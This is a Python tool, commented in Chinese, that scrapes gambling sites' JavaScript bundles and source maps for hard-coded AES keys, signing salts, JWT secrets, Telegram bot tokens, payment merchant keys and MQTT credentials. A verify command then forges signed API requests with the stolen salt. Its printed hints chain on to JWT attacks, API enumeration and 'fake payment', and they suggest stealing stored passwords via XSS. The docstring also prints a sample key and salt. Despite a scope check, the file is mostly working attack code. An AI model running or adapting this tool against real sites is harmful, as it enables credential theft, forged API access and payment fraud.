#!/usr/bin/env python3
"""JS Bundle 密钥猎手 — 博彩站前端 AES/签名材料提取。

博彩站的前端 JS bundle 中几乎 100% 硬编码了 API 签名 salt 和 AES key，
提取后可在站外离线重放所有 API 请求，完全绕过浏览器环境限制。

典型案例（wlyx888 / wldzylbot 同款模式）:
  AES KEY:  4523E51C8F78D3ED
  MD5 Salt: FA72ACE15FEB1FB2111E9AE1938550DABCCA4E52

示例:
  python3 炼蛊房/js_secret_hunter.py doctor
  python3 炼蛊房/js_secret_hunter.py hunt \
    --base https://target.com --case <案卷>
  python3 炼蛊房/js_secret_hunter.py file \
    --path ~/Downloads/app.js --case <案卷>
  python3 炼蛊房/js_secret_hunter.py verify \
    --base https://target.com/api.html \
    --key 4523E51C8F78D3ED --salt FA72ACE1... --case <案卷>
"""
from __future__ import annotations
import argparse
import hashlib
import json
import re
import sys
import urllib.parse
from datetime import datetime, UTC
from pathlib import Path

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

ENGINE = Path(__file__).resolve().parents[1]
OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope  # noqa: E402

def _now(): return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "js_secrets"
    d.mkdir(parents=True, exist_ok=True)
    return d

# ────── 正则模式库 ──────
PATTERNS = {
    # AES KEY：通常 16/24/32 字节十六进制或 Base64
    "aes_hex_16":     re.compile(r'''['"]([\dA-Fa-f]{16})['"]'''),
    "aes_hex_24":     re.compile(r'''['"]([\dA-Fa-f]{24})['"]'''),
    "aes_hex_32":     re.compile(r'''['"]([\dA-Fa-f]{32})['"]'''),
    "aes_b64_16":     re.compile(r'''['"]([A-Za-z0-9+/]{22}==|[A-Za-z0-9+/]{24})['"]'''),
    # MD5/SHA1 sign salt：40 位十六进制
    "sha1_salt":      re.compile(r'''['"]([\dA-Fa-f]{40})['"]'''),
    # MD5 salt：32 位
    "md5_salt":       re.compile(r'''['"]([\dA-Fa-f]{32})['"]'''),
    # SHA256
    "sha256_salt":    re.compile(r'''['"]([\dA-Fa-f]{64})['"]'''),
    # JWT secret（通常在变量赋值里）
    "jwt_secret":     re.compile(
        r'''(?:secret|jwtSecret|JWT_SECRET|secretKey)\s*[=:]\s*['"]([^'"]{16,128})['"]''', re.I),
    # API base URL
    "api_base_url":   re.compile(r'''['"]https?://[^\s'"]{5,80}/api[.\w]*['"]'''),
    # localStorage 密钥存储（登录记住密码）
    "localstorage_pw": re.compile(
        r'''(?:localStorage\.setItem|localStorage\[)\s*\(?['"]([^'"]{3,40}[pP]ass[^'"]{0,20})['"]'''),
    "localstorage_user": re.compile(
        r'''(?:localStorage\.setItem|localStorage\[)\s*\(?['"]([^'"]{3,40}(?:user|name|account|login)[^'"]{0,20})['"]''', re.I),
    # AES 调用上下文（找 key 变量）
    "aes_key_var":    re.compile(
        r'''(?:key|aesKey|encKey|KEY|AES_KEY|secretKey)\s*[:=]\s*['"]([A-Za-z0-9+/=]{8,64})['"]''', re.I),
    # Sign / HMAC salt 变量
    "sign_salt_var":  re.compile(
        r'''(?:salt|signSalt|sign_salt|SALT|hmacKey|signKey|secretKey)\s*[:=]\s*['"]([A-Za-z0-9]{16,128})['"]''', re.I),
    # C2 零信任控制台（敲门 / HMAC / PTY）；验洞走 c2_zt_probe
    "c2_hmac_ctx":    re.compile(
        r'''(?:hmac|xAuth|x-auth|spake2|knockKey|authKey)\s*[:=]\s*['"]([A-Za-z0-9+/=_\-]{8,64})['"]''', re.I),
    "c2_pty_ws":      re.compile(r'''['"](wss?://[^'"]+/(?:pty|console|terminal)[^'"]*)['"]''', re.I),
    "c2_knock_seq":   re.compile(
        r'''(?:knock|handshake)[^;]{0,80}?(\d{2,5}\s*,\s*\d{2,5}(?:\s*,\s*\d{2,5})+)''', re.I),
    # Bot Token（博彩站 TG 机器人）
    "tg_bot_token":   re.compile(r'''\b(\d{8,12}:[A-Za-z0-9_-]{35})\b'''),
    # 支付通道密钥（常见字段名）
    "pay_key":        re.compile(
        r'''(?:appKey|app_key|merchantKey|secretKey|paySecret|md5Key|privateKey)\s*[:=]\s*['"]([^'"]{8,128})['"]''', re.I),
    # AppID
    "app_id":         re.compile(
        r'''(?:appId|app_id|merchantId|merchant_id|tencent_appid)\s*[:=]\s*['"]([A-Za-z0-9_-]{4,64})['"]''', re.I),
    # MQTT 凭据
    "mqtt_user":      re.compile(r'''(?:mqttUser|mqtt_user|mqUser)\s*[:=]\s*['"]([^'"]{2,40})['"]''', re.I),
    "mqtt_pass":      re.compile(r'''(?:mqttPass|mqtt_pass|mqPass|mqttPassword)\s*[:=]\s*['"]([^'"]{2,40})['"]''', re.I),
    # OSS / Cloud Storage
    "pig4cloud":      re.compile(r'''thanks,pig4cloud'''),
    "gcs_bucket":     re.compile(r'''['"]([a-z0-9-]{3,40}\.storage\.googleapis\.com[^'"]{0,40})['"]'''),
}

# 已知噪声值（过滤掉）
NOISE_VALUES = {
    "0000000000000000", "1111111111111111", "aaaaaaaaaaaaaaaa",
    "0123456789abcdef", "abcdef1234567890",
    "0" * 32, "f" * 32, "0" * 40, "f" * 40,
    "null", "true", "false", "undefined",
}

def _score_secret(category: str, value: str) -> int:
    """给提取的值打可信度分（0-100）。"""
    score = 50
    # 高熵值加分
    unique_chars = len(set(value.lower()))
    score += min(unique_chars * 2, 20)
    # 符合已知密钥长度加分
    if len(value) in (16, 24, 32, 40, 64): score += 10
    # 与密钥相关的变量名加分
    if "key" in category.lower() or "salt" in category.lower(): score += 10
    # 重复字符扣分
    if len(set(value)) < 4: score -= 40
    # 是否全是数字（可能只是数字字符串）
    if value.isdigit(): score -= 20
    return max(0, min(100, score))

def hunt_in_text(text: str, source: str = "") -> list[dict]:
    """对文本内容执行所有模式匹配，返回发现列表。"""
    findings = []
    seen = set()
    for category, pattern in PATTERNS.items():
        for m in pattern.finditer(text):
            val = m.group(1) if m.lastindex else m.group(0)
            if val in NOISE_VALUES or val in seen: continue
            if len(val) < 4: continue
            seen.add(val)
            score = _score_secret(category, val)
            context_start = max(0, m.start() - 60)
            context_end = min(len(text), m.end() + 60)
            findings.append({
                "category": category,
                "value": val,
                "score": score,
                "source": source,
                "context": text[context_start:context_end].replace("\n", " "),
            })
    return findings

def _get_js_urls(base: str, sess) -> list[str]:
    """从主页 HTML 中提取所有 JS 文件 URL。"""
    js_urls = []
    try:
        r = sess.get(base, timeout=12, allow_redirects=True)
        # 内联 script src
        for m in re.finditer(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', r.text, re.I):
            src = m.group(1)
            if src.startswith("http"):
                js_urls.append(src)
            elif src.startswith("//"):
                js_urls.append("https:" + src)
            else:
                js_urls.append(base.rstrip("/") + "/" + src.lstrip("/"))
        # 常见打包路径
        for guess in [
            "/js/app.js", "/static/js/app.js", "/assets/index.js",
            "/static/js/chunk-vendors.js", "/static/js/main.js",
            "/dist/app.js", "/build/app.js",
            "/console/app.js", "/assets/index.js",
        ]:
            js_urls.append(base.rstrip("/") + guess)
    except Exception:
        pass
    return list(dict.fromkeys(js_urls))  # 去重保序

SOURCEMAP_RE = re.compile(r"//[#@]\s*sourceMappingURL=(\S+)")


def _sourcemap_urls(js_url: str, js_text: str) -> list[str]:
    urls: list[str] = []
    tail = js_text[-4000:] if len(js_text) > 4000 else js_text
    m = SOURCEMAP_RE.search(tail)
    if m:
        loc = m.group(1).strip().rstrip("*/").strip()
        if loc.startswith("data:"):
            pass
        elif loc.startswith("http://") or loc.startswith("https://"):
            urls.append(loc)
        else:
            urls.append(urllib.parse.urljoin(js_url, loc))
    urls.append(js_url + ".map")
    return list(dict.fromkeys(urls))


def _hunt_sourcemap(sess, map_url: str) -> tuple[bool, list[dict]]:
    """拉 .map；只猎密钥，不把 sourcesContent 全文落盘。"""
    try:
        r = sess.get(map_url, timeout=15)
    except Exception:
        return False, []
    if r.status_code != 200 or len(r.content) < 80 or len(r.content) > 12 * 1024 * 1024:
        return False, []
    try:
        data = r.json()
    except Exception:
        return False, []
    if not isinstance(data, dict):
        return False, []
    if "mappings" not in data and "sourcesContent" not in data:
        return False, []
    chunks = [sc for sc in (data.get("sourcesContent") or []) if isinstance(sc, str) and sc]
    blob = "\n".join(chunks) if chunks else r.text[:500_000]
    findings = hunt_in_text(blob, map_url)
    return True, findings


def cmd_doctor(_: argparse.Namespace) -> int:
    print(f"[{'ok' if HAS_REQUESTS else 'missing'}] requests")
    print(f"[ok] {len(PATTERNS)} secret patterns")
    print("[ok] js_secret_hunter ready")
    return 0

def cmd_hunt(args: argparse.Namespace) -> int:
    base = args.base.rstrip("/")
    domain = host_of(base)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")
    if not args.case and not args.out:
        raise SystemExit("[err] 需要 --case 或 --out")

    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0"

    js_urls = _get_js_urls(base, sess)[:30]
    print(f"[*] discovered {len(js_urls)} JS files to scan", flush=True)

    all_findings = []
    maps_hit = []
    seen_maps = set()
    for i, url in enumerate(js_urls, 1):
        print(f"  [{i}/{len(js_urls)}] {url}", flush=True)
        try:
            r = sess.get(url, timeout=15)
            ctype = r.headers.get("content-type", "text/javascript")
            if r.status_code != 200 or ("javascript" not in ctype and "ecmascript" not in ctype):
                if len(r.content) < 500:
                    continue
            findings = hunt_in_text(r.text, url)
            if findings:
                high = [f for f in findings if f["score"] >= 60]
                print(f"  ★ [{len(findings)} finds, {len(high)} high-score] {url}", flush=True)
                for f in sorted(high, key=lambda x: -x["score"])[:5]:
                    print(f"    [{f['score']:3d}] {f['category']:25s} = {f['value']!r}", flush=True)
                all_findings.extend(findings)
            for map_url in _sourcemap_urls(url, r.text):
                if map_url in seen_maps:
                    continue
                seen_maps.add(map_url)
                ok, mf = _hunt_sourcemap(sess, map_url)
                if not ok:
                    continue
                maps_hit.append(map_url)
                print(f"  ★ SourceMap {map_url} ({len(mf)} secrets)", flush=True)
                all_findings.extend(mf)
        except Exception:
            pass

    # 去重 + 排序
    seen_vals = set()
    deduped = []
    for f in sorted(all_findings, key=lambda x: -x["score"]):
        k = (f["category"], f["value"])
        if k not in seen_vals:
            seen_vals.add(k)
            deduped.append(f)

    payload = {
        "ts": _now(),
        "base": base,
        "sourcemaps": maps_hit,
        "findings": deduped,
        "playbook": "传承/星念蛊.md",
        "next": "有 AES/salt → api_dispatcher_enum；有 jwt secret → jwt_gql_probe；支付 sign → 假支付",
    }
    written = []
    if args.case:
        out = case_dir(args.case)
        out_json = out / "js_secrets.json"
        out_json.write_text(json.dumps(payload, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        written.append(out_json)
    if args.out:
        out_path = Path(args.out)
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(json.dumps(payload, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        written.append(out_path)
    out_json = written[0]
    print(f"\n[result] {len(deduped)} unique secrets found; sourcemaps={len(maps_hit)}")
    # 高价值提示
    aes_keys = [f for f in deduped if "aes" in f["category"] and f["score"] >= 60]
    salts = [f for f in deduped if "salt" in f["category"] and f["score"] >= 60]
    tg_tokens = [f for f in deduped if f["category"] == "tg_bot_token"]
    ls_pws = [f for f in deduped if "localstorage_pw" in f["category"]]
    if aes_keys:
        print("\n★★★ 疑似 AES KEY:")
        for f in aes_keys[:3]: print(f"  {f['value']!r}  (score={f['score']}, src={f['source'][-50:]})")
    if salts:
        print("\n★★★ 疑似 Sign Salt:")
        for f in salts[:3]: print(f"  {f['value']!r}  (score={f['score']})")
    if tg_tokens:
        print(f"\n★★★ TG Bot Token: {[f['value'] for f in tg_tokens]}")
    if ls_pws:
        print(f"\n★ localStorage 密码字段: {[f['value'] for f in ls_pws]}")
        print("  → 可通过 XSS 窃取: localStorage.getItem('h5_login_password')")
    print(f"\n[+] → {out_json}")
    jwt_secs = [f for f in deduped if f["category"] == "jwt_secret"]
    if jwt_secs:
        print("\n[next] python3 炼蛊房/jwt_gql_probe.py -u {0} --token <打码> --case {1}".format(
            base, args.case or "<案卷>"))
    if aes_keys or salts:
        print("\n[next] python3 炼蛊房/api_dispatcher_enum.py scan \\")
        print(f"  --base {base}/api.html \\")
        print(f"  --key {aes_keys[0]['value'] if aes_keys else '<AES_KEY>'} \\")
        print(f"  --salt {salts[0]['value'] if salts else '<SALT>'} \\")
        print(f"  --case {args.case}")
    return 0 if deduped else 1

def cmd_file(args: argparse.Namespace) -> int:
    """对本地 JS 文件做密钥扫描。"""
    p = Path(args.path)
    if not p.is_file():
        raise SystemExit(f"[err] file not found: {p}")
    text = p.read_text(encoding="utf-8", errors="ignore")
    findings = hunt_in_text(text, str(p))
    findings.sort(key=lambda x: -x["score"])
    for f in findings[:30]:
        print(f"  [{f['score']:3d}] {f['category']:25s} = {f['value']!r}")
    if args.case:
        out = case_dir(args.case) / (p.name + ".secrets.json")
        out.write_text(json.dumps({"ts": _now(), "file": str(p), "findings": findings},
                                  ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        print(f"[+] → {out}")
    print(f"\n[result] {len(findings)} secrets found in {p.name}")
    return 0

def cmd_verify(args: argparse.Namespace) -> int:
    """验证提取到的 AES key + sign salt 是否能正常调用 API。"""
    api_base = args.base.rstrip("/")
    domain = host_of(api_base)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")

    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad, unpad
        HAS_CRYPTO = True
    except ImportError:
        HAS_CRYPTO = False
        print("[warn] pycryptodome not installed; skipping encryption test")

    # 测试匿名方法（无需登录）
    test_methods = ["playlist", "gametype", "gamelist", "getcopyright", "carousel"]
    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0"

    print(f"[*] verifying API key/salt against {api_base}")
    print(f"    key={args.key!r}  salt={args.salt!r}")

    results = []
    for method in test_methods:
        # 构造签名（MD5 方式：常见博彩站模式）
        ts = str(int(__import__("time").time()))
        sign_str = f"method={method}&salt={args.salt}&timestamp={ts}"
        sign = hashlib.md5(sign_str.encode()).hexdigest().upper()
        params = {"method": method, "timestamp": ts, "sign": sign}

        try:
            r = sess.get(api_base, params=params, timeout=10)
            data = {}
            try: data = r.json()
            except: pass
            code = data.get("code", data.get("status", -1))
            success = r.status_code == 200 and code not in (-1, "error", 1001, "1001")
            print(f"  [{method:20s}] status={r.status_code} code={code} "
                  f"{'★OK' if success else '  NG'}")
            results.append({"method": method, "ok": success, "code": code})
        except Exception as e:
            print(f"  [{method:20s}] err: {e}")
    ok = [r for r in results if r["ok"]]
    if ok:
        print(f"\n★★★ {len(ok)} 个方法验证成功！AES key + salt 可用")
        print("    → python3 炼蛊房/api_dispatcher_enum.py scan \\")
        print(f"      --base {api_base} --key {args.key} --salt {args.salt} --case {args.case}")
    return 0 if ok else 1

def main() -> int:
    p = argparse.ArgumentParser(description="JS Bundle 密钥猎手（博彩站专项）")
    sub = p.add_subparsers(dest="cmd", required=True)

    d = sub.add_parser("doctor"); d.set_defaults(func=cmd_doctor)

    h = sub.add_parser("hunt", help="从站点 JS / SourceMap 自动提取密钥")
    h.add_argument("--base", "-u", required=True)
    h.add_argument("--case", default="")
    h.add_argument("--out", default="")
    h.set_defaults(func=cmd_hunt)

    f = sub.add_parser("file", help="对本地 JS 文件扫描")
    f.add_argument("--path", required=True)
    f.add_argument("--case", default="")
    f.set_defaults(func=cmd_file)

    v = sub.add_parser("verify", help="验证 key+salt 能否调用 API")
    v.add_argument("--base", required=True, help="如 https://api.target.com/api.html")
    v.add_argument("--key",  required=True, help="AES KEY")
    v.add_argument("--salt", required=True, help="Sign Salt")
    v.add_argument("--case", default="")
    v.set_defaults(func=cmd_verify)

    args = p.parse_args()
    return int(args.func(args) or 0)

if __name__ == "__main__":
    raise SystemExit(main())
